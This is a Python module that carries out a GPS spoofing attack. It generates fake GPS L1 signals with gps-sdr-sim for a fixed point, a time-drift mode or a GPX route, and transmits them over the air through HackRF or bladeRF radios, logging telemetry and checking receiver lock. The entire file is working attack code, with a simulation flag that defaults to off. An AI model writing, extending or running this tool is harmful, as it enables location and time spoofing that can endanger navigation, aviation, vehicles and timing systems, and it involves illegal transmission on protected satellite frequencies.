import os
import time
import subprocess
import logging
import json
import random
from datetime import datetime
from typing import Optional, List, Tuple

logger = logging.getLogger("GPSSpoofer")
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

GPS_SDR_SIM_PATH = "/usr/local/bin/gps-sdr-sim"
IQ_OUTPUT_FILE = "data/gps_iq.bin"
SUPPORTED_DEVICES = ["hackrf", "bladerf", "usrp"]
SUPPORTED_MODES = ["location_spoof", "ntp_drift", "dynamic_path"]
DEFAULT_DURATION = 30


def _check_dependencies() -> bool:
    if not os.path.exists(GPS_SDR_SIM_PATH):
        logger.error("[Dependency] gps-sdr-sim binary not found at expected location.")
        return False
    return True


def parse_gpx_route(gpx_file: str) -> List[Tuple[float, float, float]]:
    import xml.etree.ElementTree as ET
    tree = ET.parse(gpx_file)
    root = tree.getroot()
    ns = {'default': 'http://www.topografix.com/GPX/1/1'}
    coords = []
    for trkpt in root.findall(".//default:trkpt", ns):
        lat = float(trkpt.attrib['lat'])
        lon = float(trkpt.attrib['lon'])
        ele_tag = trkpt.find('default:ele', ns)
        ele = float(ele_tag.text) if ele_tag is not None else 100.0
        coords.append((lat, lon, ele))
    return coords


def generate_gps_signal(
    latitude: float,
    longitude: float,
    altitude: float = 100.0,
    date_utc: Optional[str] = None,
    drift_mode: Optional[str] = None,
    simulation: bool = False,
    power_dbm: Optional[int] = 40
) -> bool:
    if not _check_dependencies():
        return False

    cmd = [
        GPS_SDR_SIM_PATH,
        "-e", "brdc",  # Broadcast ephemeris
        "-l", f"{latitude},{longitude},{altitude}",
        "-o", IQ_OUTPUT_FILE
    ]

    if date_utc:
        cmd += ["-t", date_utc]

    if drift_mode == "ntp_drift":
        cmd += ["-T", "10"]

    if simulation:
        logger.info(f"[SIM] Generating GPS IQ sample for {latitude},{longitude}")
        return True

    logger.info("[GPS Spoof] Generating GPS IQ sample...")
    try:
        subprocess.check_call(cmd)
        logger.info("[GPS Spoof] IQ file generated successfully.")
        return True
    except subprocess.CalledProcessError as e:
        logger.error(f"[GPS Spoof] gps-sdr-sim failed: {e}")
        return False


def transmit_gps_iq(
    device: str,
    duration: int,
    gain_db: int = 40,
    simulation: bool = False
):
    if simulation:
        logger.info(f"[SIM] Would transmit IQ for {duration}s on {device} at {gain_db} dB")
        return

    if not os.path.exists(IQ_OUTPUT_FILE):
        logger.error("[TX] IQ file missing. Run signal generation first.")
        return

    cmd = []

    if device == "hackrf":
        cmd = [
            "hackrf_transfer",
            "-t", IQ_OUTPUT_FILE,
            "-f", "1575420000",  # GPS L1 center
            "-s", "2600000",
            "-x", str(gain_db),
            "-a", "1",
            "-l", "32",
            "-n", str(2600000 * duration)
        ]
    elif device == "bladerf":
        cmd = ["bladeRF-cli", "-s", f"tx config file={IQ_OUTPUT_FILE}, format=bin"]
    else:
        logger.warning(f"[TX] Unsupported device: {device}")
        return

    try:
        logger.info(f"[TX] Transmitting via {device} at {gain_db} dB")
        subprocess.check_call(cmd)
        logger.info("[TX] Transmission complete.")
    except Exception as e:
        logger.error(f"[TX] Transmission failed: {e}")


def monitor_gnss_lock():
    try:
        logger.info("[GNSS] Checking GNSS lock using gpsmon...")
        proc = subprocess.Popen(["gpsmon"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        proc.terminate()
    except Exception as e:
        logger.warning(f"[GNSS] gpsmon failed: {e}")


def gps_spoof_attack(
    latitude: float = 37.7749,
    longitude: float = -122.4194,
    altitude: float = 100.0,
    duration: int = DEFAULT_DURATION,
    device: str = "hackrf",
    spoof_mode: str = "location_spoof",
    simulation: bool = False,
    telemetry_log: Optional[str] = None,
    path_file: Optional[str] = None
):
    logger.info(f"[GPS Spoof] Starting | Mode={spoof_mode} | Device={device}")

    if device not in SUPPORTED_DEVICES:
        logger.error(f"[GPS Spoof] Invalid SDR device: {device}")
        return

    if spoof_mode not in SUPPORTED_MODES:
        logger.error(f"[GPS Spoof] Invalid spoof mode: {spoof_mode}")
        return

    if spoof_mode == "dynamic_path" and not path_file:
        logger.error("[GPS Spoof] Path mode requires GPX input.")
        return

    points = parse_gpx_route(path_file) if spoof_mode == "dynamic_path" else [(latitude, longitude, altitude)]

    for lat, lon, alt in points:
        gain = random.randint(30, 50)

        if not generate_gps_signal(lat, lon, alt, drift_mode=spoof_mode, simulation=simulation, power_dbm=gain):
            continue

        transmit_gps_iq(device, duration, gain, simulation)

        if telemetry_log:
            os.makedirs(os.path.dirname(telemetry_log), exist_ok=True)
            with open(telemetry_log, "a") as f:
                f.write(json.dumps({
                    "timestamp": datetime.utcnow().isoformat(),
                    "lat": lat,
                    "lon": lon,
                    "alt": alt,
                    "device": device,
                    "gain": gain,
                    "mode": spoof_mode,
                    "simulation": simulation
                }) + "\n")

        monitor_gnss_lock()

        if spoof_mode != "dynamic_path":
            break


#  Alias for engine compatibility
gps_spoof_sim = gps_spoof_attack
